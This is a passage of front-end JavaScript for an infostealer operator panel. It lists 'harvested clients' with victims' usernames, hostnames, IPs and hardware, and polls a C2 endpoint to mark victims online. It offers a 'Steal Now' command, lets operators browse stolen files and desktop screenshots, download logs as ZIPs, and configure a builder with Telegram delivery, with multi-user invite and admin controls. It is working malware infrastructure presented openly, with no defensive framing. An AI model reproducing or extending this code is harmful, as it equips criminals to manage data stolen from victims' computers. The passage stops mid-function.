// State Management
let currentPage = 1;
const logsLimit = 15;
let searchQuery = '';
let searchTimeout;
let blurSaveTimeout;
let currentUser = null;

function getFlagHtml(countryCode) {
    if (!countryCode || countryCode === 'Unknown') return '';
    return `<img src="https://flagcdn.com/16x12/${countryCode.toLowerCase()}.png" 
                 class="country-flag" 
                 alt="${countryCode}" 
                 title="${countryCode}"
                 style="vertical-align: middle; margin-right: 8px; border-radius: 2px; box-shadow: 0 1px 3px rgba(0,0,0,0.15);">`;
}

function formatRAM(ramMB) {
    if (!ramMB || ramMB <= 0) return 'Unknown';
    if (ramMB >= 1024) {
        const gb = ramMB / 1024;
        return `${Math.round(gb)} GB`;
    }
    return `${ramMB} MB`;
}

let currentViewLogId = null;
const binaryExts = ['.exe', '.dll', '.bin', '.dat', '.zip', '.rar', '.7z', '.gz', '.tar', '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico', '.mp3', '.mp4', '.avi', '.mov', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.pdb', '.obj', '.lib', '.so', '.dylib', '.node', '.wasm'];

function isBinary(filename) {
    const ext = '.' + filename.split('.').pop().toLowerCase();
    return binaryExts.includes(ext);
}

function buildFileTree(files) {
    const root = {};

    files.forEach(f => {
        if (f.name === 'screenshot.jpg' || f.name === 'Information.txt') return;
        const parts = f.name.replace(/\\/g, '/').split('/').filter(Boolean);
        let node = root;
        parts.forEach((part, i) => {
            if (!node[part]) {
                node[part] = i === parts.length - 1
                    ? { __file: true, __size: f.size, __path: f.name }
                    : {};
            }
            node = node[part];
        });
    });

    return root;
}

function renderFileTree(tree, depth) {
    if (depth === undefined) depth = 0;
    let html = '';

    const folders = [];
    const filesArr = [];

    Object.keys(tree).forEach(key => {
        if (key.startsWith('__')) return;
        if (tree[key].__file) {
            filesArr.push({ name: key, size: tree[key].__size, path: tree[key].__path });
        } else {
            folders.push(key);
        }
    });

    folders.forEach(folder => {
        const childCount = countTreeItems(tree[folder]);
        html += `<li class="file-tree-folder" style="padding-left: ${12 + depth * 16}px;">
            <span class="folder-toggle" onclick="this.parentElement.classList.toggle('collapsed')">
                <svg class="folder-arrow" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
                <svg class="folder-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                <span class="folder-name">${escapeHtml(folder)}</span>
                <span class="folder-count">${childCount}</span>
            </span>
            <ul class="file-tree-children">${renderFileTree(tree[folder], depth + 1)}</ul>
        </li>`;
    });

    filesArr.forEach(f => {
        const safePath = f.path.replace(/\\/g, '/').replace(/'/g, "\\'");
        html += `<li class="file-tree-file viewable" style="padding-left: ${12 + depth * 16}px;" onclick="openFileViewer(${currentViewLogId}, '${safePath}', this)">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
            <span class="file-name">${escapeHtml(f.name)}</span>
            <span class="file-size">${formatBytes(f.size)}</span>
        </li>`;
    });

    return html;
}

function countTreeItems(tree) {
    let count = 0;
    Object.keys(tree).forEach(key => {
        if (key.startsWith('__')) return;
        if (tree[key].__file) {
            count++;
        } else {
            count += countTreeItems(tree[key]);
        }
    });
    return count;
}

async function openFileViewer(logId, filePath, el) {
    document.querySelectorAll('.file-tree-file.active-file').forEach(f => f.classList.remove('active-file'));
    if (el) el.classList.add('active-file');

    const screenshotSection = document.getElementById('screenshot-section');
    const viewerSection = document.getElementById('file-viewer-section');
    const viewerTitle = document.getElementById('file-viewer-title');
    const viewerContent = document.getElementById('file-viewer-content');

    screenshotSection.style.display = 'none';
    viewerSection.style.display = 'flex';

    const filename = filePath.split('/').pop().split('\\').pop();
    viewerTitle.innerText = filename;
    viewerContent.innerHTML = '<div class="file-viewer-binary"><span>Loading...</span></div>';

    try {
        const url = `/api/logs/${logId}?file=${encodeURIComponent(filePath)}`;
        console.log('[FileViewer] Fetching:', url);
        const res = await fetch(url);
        const text = await res.text();
        console.log('[FileViewer] Status:', res.status, 'Length:', text.length, 'Start:', text.substring(0, 200));
        let data;
        try {
            data = JSON.parse(text);
        } catch (parseErr) {
            throw new Error('Server error: ' + text.substring(0, 300));
        }
        if (!res.ok) throw new Error(data.error || 'Failed to load file');
        if (data.error) throw new Error(data.error);

        if (data.type === 'text') {
            const lines = data.content.split('\n');
            const lineCount = lines.length;
            const charCount = data.content.length;
            let linesHtml = lines.map((line, i) =>
                `<div class="line"><span class="line-num">${i + 1}</span><span class="line-content">${escapeHtml(line)}</span></div>`
            ).join('');

            viewerContent.innerHTML = `
                <div class="file-viewer-text">${linesHtml}</div>
                <div class="file-viewer-bar">
                    <div class="viewer-info">
                        <span>${lineCount} lines</span>
                        <span>${formatBytes(charCount)}</span>
                    </div>
                    <span>${filename}</span>
                </div>
            `;
        } else {
            viewerContent.innerHTML = `
                <div class="file-viewer-binary">
                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                    <span>Binary file${data.size ? ' — ' + formatBytes(data.size) : ''}</span>
                    <span style="font-size: 11px; color: var(--text-muted);">Preview not available</span>
                </div>
            `;
        }
    } catch (err) {
        viewerContent.innerHTML = `<div class="file-viewer-binary"><span style="color: var(--accent-red);">Error: ${escapeHtml(err.message)}</span></div>`;
    }
}

function closeFileViewer() {
    document.getElementById('file-viewer-section').style.display = 'none';
    document.getElementById('screenshot-section').style.display = 'flex';
    document.querySelectorAll('.file-tree-file.active-file').forEach(f => f.classList.remove('active-file'));
}

// Routing - Tab Switching
document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');

        const tabName = btn.getAttribute('data-tab');
        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
        document.getElementById(`${tabName}-tab`).classList.add('active');

        if (tabName === 'dashboard') {
            loadDashboardStats();
        } else if (tabName === 'clients') {
            loadClients();
        } else if (tabName === 'settings') {
            loadSettings();
        }
    });
});

// Builder Delivery Form Toggle
const buildDeliveryRadios = document.querySelectorAll('input[name="build-delivery"]');
buildDeliveryRadios.forEach(radio => {
    radio.addEventListener('change', (e) => {
        const value = e.target.value;
        if (value === 'TELEGRAM') {
            document.getElementById('build-tg-fields').style.display = 'block';
            document.getElementById('build-panel-fields').style.display = 'none';
        } else if (value === 'PANEL') {
            document.getElementById('build-tg-fields').style.display = 'none';
            document.getElementById('build-panel-fields').style.display = 'block';
        }
    });
});

// Theme Selectors
document.querySelectorAll('.theme-selector').forEach(sel => {
    sel.addEventListener('click', async () => {
        document.querySelectorAll('.theme-selector').forEach(s => s.classList.remove('active'));
        sel.classList.add('active');

        const theme = sel.getAttribute('data-theme');
        document.body.className = theme;

        // If switching to built-in theme, hide custom background controls
        if (theme !== 'theme-custom') {
            document.getElementById('blur-control-group').style.display = 'none';
        }

        // Save theme persistent
        try {
            await fetch('/api/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ active_bg_theme: theme })
            });
        } catch (err) {
            console.error('Error saving theme:', err);
        }
    });
});

let autoRefreshInterval = null;
let lastTotalLogs = null;

function startAutoRefresh() {
    if (autoRefreshInterval) clearInterval(autoRefreshInterval);
    
    const refreshEnabled = localStorage.getItem('auto_refresh_enabled') !== 'false';
    if (refreshEnabled) {
        autoRefreshInterval = setInterval(async () => {
            const activeTab = document.querySelector('.nav-btn.active')?.getAttribute('data-tab');
            if (activeTab === 'dashboard') {
                await loadDashboardStats();
            } else if (activeTab === 'clients') {
                await loadClientsSilent();
            } else {
                try {
                    const res = await fetch('/api/stats');
                    const stats = await res.json();
                    checkNewLogs(stats.totalLogs);
                } catch (e) {
                    console.error('Error polling stats:', e);
                }
            }
        }, 8000);
    }
}

async function checkNewLogs(currentTotal) {
    if (lastTotalLogs !== null && currentTotal > lastTotalLogs) {
        const soundEnabled = localStorage.getItem('sound_alerts_enabled') !== 'false';
        if (soundEnabled) {
            const audio = new Audio('/notify.mp3');
            audio.play().catch(e => console.log('Audio playback blocked/failed:', e));
        }

        try {
            const latestRes = await fetch('/api/logs?limit=1');
            const latestData = await latestRes.json();
            if (latestData.logs && latestData.logs.length > 0) {
                const log = latestData.logs[0];
                showToast('New log collected', `${log.username}@${log.hostname} — ${log.ip}`);
            }
        } catch (e) {
            showToast('New log collected', 'New target data received');
        }

        const activeTab = document.querySelector('.nav-btn.active')?.getAttribute('data-tab');
        if (activeTab === 'clients') {
            loadClientsSilent();
        }
    }
    lastTotalLogs = currentTotal;
}

async function loadClientsSilent() {
    try {
        const url = `/api/logs?page=${currentPage}&limit=${logsLimit}&search=${encodeURIComponent(searchQuery)}`;
        const response = await fetch(url);
        const data = await response.json();
        
        // Also check stats count
        const statsRes = await fetch('/api/stats');
        const stats = await statsRes.json();
        checkNewLogs(stats.totalLogs);

        const container = document.getElementById('clients-list-container');
        if (!data.logs || data.logs.length === 0) {
            container.innerHTML = `<div class="empty-state py-8">No harvested clients found.</div>`;
            return;
        }

        container.innerHTML = '';
        data.logs.forEach(log => {
            container.appendChild(renderClientRow(log));
        });

        document.getElementById('current-page').innerText = data.page;
        document.getElementById('total-pages').innerText = data.totalPages;
        document.getElementById('prev-page-btn').disabled = data.page <= 1;
        document.getElementById('next-page-btn').disabled = data.page >= data.totalPages;
    } catch (err) {
        console.error('Error loading clients silently:', err);
    }
}

// Initialize on Load — auth check first
window.addEventListener('DOMContentLoaded', async () => {
    try {
        const res = await fetch('/api/auth/check');
        const data = await res.json();
        if (!data.authenticated) {
            window.location.href = '/login';
            return;
        }
        currentUser = data.user;
        initAuthUI();
    } catch (e) {
        window.location.href = '/login';
        return;
    }

    await loadSettings();
    await loadDashboardStats();
    startAutoRefresh();
});

function initAuthUI() {
    document.getElementById('sidebar-username').textContent = currentUser.username;
    document.getElementById('sidebar-role').textContent = currentUser.role === 'admin' ? 'Administrator' : 'User';

    if (currentUser.role === 'admin') {
        document.getElementById('nav-admin-section').style.display = 'block';
    }


    // Logout button
    document.getElementById('logout-btn').addEventListener('click', async () => {
        try {
            await fetch('/api/auth/logout', { method: 'POST' });
        } catch (e) {}
        window.location.href = '/login';
    });

    // Admin tab nav
    const adminNavBtn = document.querySelector('[data-tab="admin"]');
    if (adminNavBtn) {
        adminNavBtn.addEventListener('click', () => {
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            adminNavBtn.classList.add('active');
            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
            document.getElementById('admin-tab').classList.add('active');
            loadAdminUsers();
            loadInvites();
        });
    }
}

// ===== INVITES =====

async function loadInvites() {
    const container = document.getElementById('invites-list');
    try {
        const res = await fetch('/api/admin/invites');
        const data = await res.json();
        if (!data.invites || data.invites.length === 0) {
            container.innerHTML = '<div class="empty-state py-4">No invitation codes yet.</div>';
            return;
        }
        container.innerHTML = data.invites.map(inv => {
            const used = inv.used_by !== null;
            return `<div class="invite-row ${used ? 'invite-used' : ''}">
                <div class="invite-code">${escapeHtml(inv.code)}</div>
                <div class="invite-status">${used ? `Used by <strong>${escapeHtml(inv.used_by)}</strong>` : 'Available'}</div>
                ${!used ? `<button class="btn-icon btn-icon-danger" onclick="deleteInvite('${escapeHtml(inv.code)}')" title="Revoke"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg></button>` : ''}
            </div>`;
        }).join('');
    } catch (e) {
        container.innerHTML = '<div class="empty-state py-4 text-danger">Failed to load invites.</div>';
    }
}

async function deleteInvite(code) {
    await fetch(`/api/admin/invites/${encodeURIComponent(code)}`, { method: 'DELETE' });
    loadInvites();
}

document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('btn-gen-invite');
    if (btn) {
        btn.addEventListener('click', async () => {
            const res = await fetch('/api/admin/invites', { method: 'POST' });
            const data = await res.json();
            if (data.code) {
                showToast('Invite Created', data.code);
                loadInvites();
            }
        });
    }
});

// ===== ADMIN PANEL =====

async function loadAdminUsers() {
    const container = document.getElementById('admin-users-table');
    try {
        const res = await fetch('/api/admin/users');
        if (!res.ok) {
            container.innerHTML = '<div class="empty-state py-8">Access denied</div>';
            return;
        }
        const data = await res.json();

        if (!data.users || data.users.length === 0) {
            container.innerHTML = '<div class="empty-state py-8">No users found</div>';
            return;
        }

        let html = `
            <div class="admin-table-header">
                <span class="col-id">#</span>
                <span class="col-user">Username</span>
                <span class="col-role">Role</span>
                <span class="col-key">API Key</span>
                <span class="col-logs">Logs</span>
                <span class="col-status">Status</span>
                <span class="col-date">Created</span>
                <span class="col-actions">Actions</span>
            </div>
        `;

        data.users.forEach(u => {
            const isSelf = u.id === currentUser.id;
            const statusClass = u.is_banned ? 'status-banned' : 'status-active';
            const statusText = u.is_banned ? 'Banned' : 'Active';
            const roleClass = u.role === 'admin' ? 'role-admin' : 'role-user';
            const maskedKey = u.api_key.substring(0, 8) + '...';

            let actions = '';
            if (!isSelf && u.role !== 'admin') {
                if (u.is_banned) {
                    actions += `<button class="btn-sm btn-green" onclick="adminUnban(${u.id})">Unban</button>`;
                } else {
                    actions += `<button class="btn-sm btn-orange" onclick="adminBan(${u.id})">Ban</button>`;
                }
                actions += `<button class="btn-sm btn-red" onclick="adminDelete(${u.id}, '${escapeHtml(u.username)}')">Delete</button>`;
                if (!u.is_banned) {
                    const newRole = u.role === 'admin' ? 'user' : 'admin';
                    actions += `<button class="btn-sm btn-blue" onclick="adminSetRole(${u.id}, '${newRole}')">${newRole === 'admin' ? 'Promote' : 'Demote'}</button>`;
                }
            } else if (isSelf) {
                actions = '<span class="text-muted">You</span>';
            } else {
                actions = '<span class="text-muted">Admin</span>';
            }

            html += `
                <div class="admin-table-row ${u.is_banned ? 'row-banned' : ''}">
                    <span class="col-id">${u.id}</span>
                    <span class="col-user"><strong>${escapeHtml(u.username)}</strong></span>
                    <span class="col-role"><span class="role-badge ${roleClass}">${u.role}</span></span>
                    <span class="col-key"><code title="${escapeHtml(u.api_key)}">${maskedKey}</code></span>
                    <span class="col-logs">${u.log_count}</span>
                    <span class="col-status"><span class="status-dot ${statusClass}"></span>${statusText}</span>
                    <span class="col-date">${formatDate(u.created_at)}</span>
                    <span class="col-actions">${actions}</span>
                </div>
            `;
        });

        container.innerHTML = html;

        // Stats row
        const statsRow = document.getElementById('admin-stats-row');
        const totalUsers = data.users.length;
        const activeUsers = data.users.filter(u => !u.is_banned).length;
        const bannedUsers = data.users.filter(u => u.is_banned).length;
        const totalLogs = data.users.reduce((sum, u) => sum + u.log_count, 0);

        statsRow.innerHTML = `
            <div class="admin-stat"><span class="admin-stat-val">${totalUsers}</span><span class="admin-stat-label">Total Users</span></div>
            <div class="admin-stat"><span class="admin-stat-val">${activeUsers}</span><span class="admin-stat-label">Active</span></div>
            <div class="admin-stat"><span class="admin-stat-val">${bannedUsers}</span><span class="admin-stat-label">Banned</span></div>
            <div class="admin-stat"><span class="admin-stat-val">${totalLogs}</span><span class="admin-stat-label">Total Logs</span></div>
        `;
    } catch (err) {
        container.innerHTML = `<div class="empty-state py-8">Error: ${escapeHtml(err.message)}</div>`;
    }
}

async function adminBan(userId) {
    showDialog({
        title: 'Ban User',
        message: 'This user will be immediately logged out and unable to access the panel.',
        type: 'warning',
        confirmText: 'Ban',
        onConfirm: async () => {
            try {
                const res = await fetch(`/api/admin/users/${userId}/ban`, { method: 'POST' });
                const data = await res.json();
                if (!res.ok) throw new Error(data.error);
                loadAdminUsers();
            } catch (err) {
                showAlert('Error', err.message);
            }
        }
    });
}

async function adminUnban(userId) {
    try {
        const res = await fetch(`/api/admin/users/${userId}/unban`, { method: 'POST' });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        loadAdminUsers();
    } catch (err) {
        showAlert('Error', err.message);
    }
}

async function adminDelete(userId, username) {
    showDialog({
        title: 'Delete User',
        message: `Permanently delete "${username}" and all their logs? This cannot be undone.`,
        type: 'danger',
        confirmText: 'Delete',
        onConfirm: async () => {
            try {
                const res = await fetch(`/api/admin/users/${userId}`, { method: 'DELETE' });
                const data = await res.json();
                if (!res.ok) throw new Error(data.error);
                loadAdminUsers();
            } catch (err) {
                showAlert('Error', err.message);
            }
        }
    });
}

async function adminSetRole(userId, newRole) {
    const action = newRole === 'admin' ? 'Promote to admin' : 'Demote to user';
    showDialog({
        title: action,
        message: `Are you sure you want to ${action.toLowerCase()} this user?`,
        type: 'warning',
        confirmText: action,
        onConfirm: async () => {
            try {
                const res = await fetch(`/api/admin/users/${userId}/role`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ role: newRole })
                });
                const data = await res.json();
                if (!res.ok) throw new Error(data.error);
                loadAdminUsers();
            } catch (err) {
                showAlert('Error', err.message);
            }
        }
    });
}

// --- Custom Background Image Upload ---
document.getElementById('custom-bg-input').addEventListener('change', async (e) => {
    const file = e.target.files[0];
    if (!file) return;

    const formData = new FormData();
    formData.append('background', file);

    try {
        const res = await fetch('/api/settings/background', {
            method: 'POST',
            body: formData
        });

        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'Upload failed');

        // Apply custom theme immediately
        applyCustomBackground(data.custom_bg_path);
        
        // Update theme selectors active state
        document.querySelectorAll('.theme-selector').forEach(s => s.classList.remove('active'));

        // Load blur value
        const blurSlider = document.getElementById('bg-blur-slider');
        applyBlurValue(blurSlider.value);

    } catch (err) {
        showAlert('Upload Failed', err.message);
    }
});

// Remove Custom Background
document.getElementById('delete-custom-bg-btn').addEventListener('click', () => {
    showDialog({
        title: 'Remove Background',
        message: 'Your custom background image will be removed and the default theme restored.',
        type: 'warning',
        confirmText: 'Remove',
        onConfirm: async () => {
            try {
                const res = await fetch('/api/settings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        custom_bg_path: '',
                        active_bg_theme: 'theme-default'
                    })
                });

                if (!res.ok) throw new Error('Failed to update settings');

                document.body.className = 'theme-default';
                document.getElementById('delete-custom-bg-btn').style.display = 'none';
                document.getElementById('blur-control-group').style.display = 'none';

                document.querySelectorAll('.theme-selector').forEach(s => {
                    if (s.getAttribute('data-theme') === 'theme-default') {
                        s.classList.add('active');
                    } else {
                        s.classList.remove('active');
                    }
                });
            } catch (err) {
                showAlert('Error', err.message);
            }
        }
    });
});

// Blur Slider Input Handler
const bgBlurSlider = document.getElementById('bg-blur-slider');
bgBlurSlider.addEventListener('input', (e) => {
    const val = e.target.value;
    applyBlurValue(val);

    // Debounce database save to prevent lag
    clearTimeout(blurSaveTimeout);
    blurSaveTimeout = setTimeout(async () => {
        try {
            await fetch('/api/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ bg_blur_value: val })
            });
        } catch (err) {
            console.error('Error saving blur value:', err);
        }
    }, 500);
});

function applyCustomBackground(url) {
    if (!url) return;
    document.body.className = 'theme-custom';
    document.documentElement.style.setProperty('--custom-bg-image', `url('${url}')`);
    document.getElementById('delete-custom-bg-btn').style.display = 'inline-flex';
    document.getElementById('blur-control-group').style.display = 'block';
}

function applyBlurValue(px) {
    document.getElementById('blur-val-display').innerText = `${px}px`;
    document.documentElement.style.setProperty('--bg-blur-val', `${px}px`);
}

// --- API Fetch Functions ---

// 1. Dashboard Statistics
async function loadDashboardStats() {
    try {
        const response = await fetch('/api/stats');
        const stats = await response.json();

        document.getElementById('stat-total-logs').innerText = stats.totalLogs || 0;
        document.getElementById('stat-logs-today').innerText = stats.logsToday || 0;
        document.getElementById('stat-unique-ips').innerText = stats.uniqueIps || 0;

        // Render OS count list
        const osList = document.getElementById('os-list');
        if (stats.osStats && stats.osStats.length > 0) {
            osList.innerHTML = '';
            const maxCount = Math.max(...stats.osStats.map(o => o.count));
            
            stats.osStats.forEach(item => {
                const percentage = maxCount > 0 ? (item.count / maxCount) * 100 : 0;
                const div = document.createElement('div');
                div.className = 'os-item';
                div.innerHTML = `
                    <span class="os-name">${escapeHtml(item.os)}</span>
                    <div class="os-progress-container">
                        <div class="os-progress-bar" style="width: ${percentage}%"></div>
                    </div>
                    <span class="os-count">${item.count}</span>
                `;
                osList.appendChild(div);
            });
        } else {
            osList.innerHTML = `<p class="empty-state">No OS data available yet.</p>`;
        }

        // Recent logs activity list
        const recentRes = await fetch('/api/logs?limit=5');
        const recentData = await recentRes.json();
        const recentList = document.getElementById('recent-list');
        
        if (recentData.logs && recentData.logs.length > 0) {
            recentList.innerHTML = '';
            recentData.logs.forEach(log => {
                const div = document.createElement('div');
                div.className = 'activity-item';
                div.innerHTML = `
                    <div class="activity-avatar"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
                    <div class="activity-details">
                        <div class="activity-title"><strong>${escapeHtml(log.username)}</strong>@${escapeHtml(log.hostname)}</div>
                        <div class="activity-meta">${formatDate(log.created_at)}</div>
                    </div>
                    <div class="activity-ip">${getFlagHtml(log.country_code)}${log.ip}</div>
                `;
                recentList.appendChild(div);
            });
        } else {
            recentList.innerHTML = `<p class="empty-state">No recent activity.</p>`;
        }
        checkNewLogs(stats.totalLogs);
    } catch (err) {
        console.error('Error loading dashboard stats:', err);
    }
}

// 2. Clients Horizontal list
function renderClientRow(log, isOnline) {
    const row = document.createElement('div');
    row.className = 'client-row';
    row.dataset.id = log.id;

    const dateStr = formatDate(log.created_at);
    const statusClass = isOnline ? 'status-online' : 'status-offline';
    const statusText = isOnline ? 'Online' : 'Offline';
    const clientId = log.hostname + '_' + log.username;

    row.innerHTML = `
        <div class="client-checkbox">
            <input type="checkbox" data-log-id="${log.id}" onchange="updateBulkActions()">
        </div>
        <div class="client-status-pill ${statusClass}">
            <span class="status-dot"></span>
            <span class="status-text">${statusText}</span>
        </div>
        <div class="client-info-user">
            <strong>${escapeHtml(log.username)}</strong>
            <span>@${escapeHtml(log.hostname)}</span>
        </div>
        <div class="client-info-ip">${getFlagHtml(log.country_code)}${log.ip}</div>
        <div class="client-info-os"><span>${escapeHtml(log.os)}</span></div>
        <div class="client-info-files"><span>${log.file_count} files</span></div>
        <div class="client-info-date">${dateStr}</div>
        <div class="client-info-actions">
            ${isOnline ? `<button class="btn-icon btn-icon-success" onclick="sendStealCommand('${escapeHtml(clientId)}')" title="Steal Now">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
            </button>` : ''}
            <button class="btn-icon" onclick="viewLogDetails(${log.id})" title="Inspect">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
            </button>
            <a href="/api/logs/${log.id}/download" class="btn-icon btn-icon-primary" title="Download ZIP">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            </a>
            <button class="btn-icon btn-icon-danger" onclick="quickDeleteLog(${log.id}, this)" title="Delete">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
            </button>
        </div>
    `;

    const checkbox = row.querySelector('input[type="checkbox"]');
    checkbox.addEventListener('change', () => {
        row.classList.toggle('selected', checkbox.checked);
    });

    return row;
}

function getSelectedLogIds() {
    return Array.from(document.querySelectorAll('.client-checkbox input[type="checkbox"]:checked'))
        .map(cb => parseInt(cb.dataset.logId));
}

function updateBulkActions() {
    const selected = getSelectedLogIds();
    const bar = document.getElementById('bulk-actions');
    const countEl = document.getElementById('bulk-count-num');

    if (selected.length > 0) {
        bar.classList.add('visible');
        countEl.innerText = selected.length;
    } else {
        bar.classList.remove('visible');
    }
}

async function loadClients() {
    const container = document.getElementById('clients-list-container');
    try {
        container.innerHTML = `<div class="empty-state py-8">Loading client list...</div>`;
        document.getElementById('bulk-actions').classList.remove('visible');

        const [logsRes, c2Res] = await Promise.all([
            fetch(`/api/logs?page=${currentPage}&limit=${logsLimit}&search=${encodeURIComponent(searchQuery)}`),
            fetch('/api/c2/clients')
        ]);
        const data = await logsRes.json();
        const c2Clients = await c2Res.json();

        const onlineSet = new Set();
        const now = Date.now();
        c2Clients.forEach(c => {
            const hb = new Date(c.last_heartbeat + 'Z').getTime();
            if (now - hb < 60000) onlineSet.add(c.client_id);
        });

        if (!data.logs || data.logs.length === 0) {
            container.innerHTML = `<div class="empty-state py-8">No harvested clients found.</div>`;
            document.getElementById('prev-page-btn').disabled = true;
            document.getElementById('next-page-btn').disabled = true;
            return;
        }

        container.innerHTML = '';
        data.logs.forEach(log => {
            const clientId = log.hostname + '_' + log.username;
            const isOnline = onlineSet.has(clientId);
            container.appendChild(renderClientRow(log, isOnline));
        });

        document.getElementById('current-page').innerText = data.page;
        document.getElementById('total-pages').innerText = data.totalPages;
        document.getElementById('prev-page-btn').disabled = data.page <= 1;
        document.getElementById('next-page-btn').disabled = data.page >= data.totalPages;

    } catch (err) {
        console.error('Error loading clients:', err);
        container.innerHTML = `<div class="empty-state py-8 text-danger">Failed to load clients.</div>`;
    }
}

// 3. Inspect details in Modal
async function viewLogDetails(id) {
    try {
        currentViewLogId = id;
        closeFileViewer();

        const response = await fetch(`/api/logs/${id}`);
        if (!response.ok) throw new Error('Failed to load log details');

        const { log, files } = await response.json();

        document.getElementById('modal-title').innerText = `${log.username} @ ${log.hostname}`;
        document.getElementById('modal-subtitle').innerText = `Received: ${formatDate(log.created_at)}`;

        // Populate metadata (no emojis!)
        const metaGrid = document.getElementById('modal-meta-grid');
        metaGrid.innerHTML = `
            <div class="meta-item">
                <span class="meta-label">Username</span>
                <span class="meta-val">${escapeHtml(log.username)}</span>
            </div>
            <div class="meta-item">
                <span class="meta-label">Hostname</span>
                <span class="meta-val">${escapeHtml(log.hostname)}</span>
            </div>
            <div class="meta-item">
                <span class="meta-label">IP Address</span>
                <span class="meta-val">${getFlagHtml(log.country_code)}${log.ip}</span>
            </div>
            <div class="meta-item">
                <span class="meta-label">OS Version</span>
                <span class="meta-val">${escapeHtml(log.os)}</span>
            </div>
            <div class="meta-item" style="grid-column: span 2;">
                <span class="meta-label">Processor</span>
                <span class="meta-val">${escapeHtml(log.cpu)}</span>
            </div>
            <div class="meta-item">
                <span class="meta-label">RAM Amount</span>
                <span class="meta-val">${formatRAM(log.ram)}</span>
            </div>
            <div class="meta-item">
                <span class="meta-label">Local Time</span>
                <span class="meta-val">${log.date_time || 'Unknown'}</span>
            </div>
        `;

        // Populate Files as tree
        const fileList = document.getElementById('modal-file-list');
        const tree = buildFileTree(files);
        const treeHtml = renderFileTree(tree, 0);
        if (treeHtml) {
            fileList.innerHTML = treeHtml;
        } else {
            fileList.innerHTML = '<li class="file-item empty-state">No stolen content found.</li>';
        }

        // Set Screenshot
        const screenshotContainer = document.getElementById('modal-screenshot-container');
        if (log.has_screenshot) {
            const scUrl = `/uploads/screenshots/${log.zip_filename.replace('.zip', '.jpg')}`;
            screenshotContainer.innerHTML = `<img src="${scUrl}" alt="Desktop Screenshot" onclick="window.open(this.src)">`;
        } else {
            screenshotContainer.innerHTML = `<div class="empty-state">No screenshot captured.</div>`;
        }

        // Action Buttons Setup
        document.getElementById('modal-download-btn').href = `/api/logs/${id}/download`;
        
        const deleteBtn = document.getElementById('modal-delete-btn');
        const newDeleteBtn = deleteBtn.cloneNode(true);
        deleteBtn.parentNode.replaceChild(newDeleteBtn, deleteBtn);
        newDeleteBtn.addEventListener('click', () => {
            showDialog({
                title: 'Delete Log',
                message: `Remove all harvested data for ${log.username}@${log.hostname}? This cannot be undone.`,
                type: 'danger',
                confirmText: 'Delete',
                onConfirm: async () => {
                    await deleteLog(id);
                    closeModal();
                    loadClients();
                }
            });
        });

        document.getElementById('details-modal').classList.add('active');
    } catch (err) {
        showAlert('Error', err.message);
    }
}

async function deleteLog(id) {
    try {
        await fetch(`/api/logs/${id}`, { method: 'DELETE' });
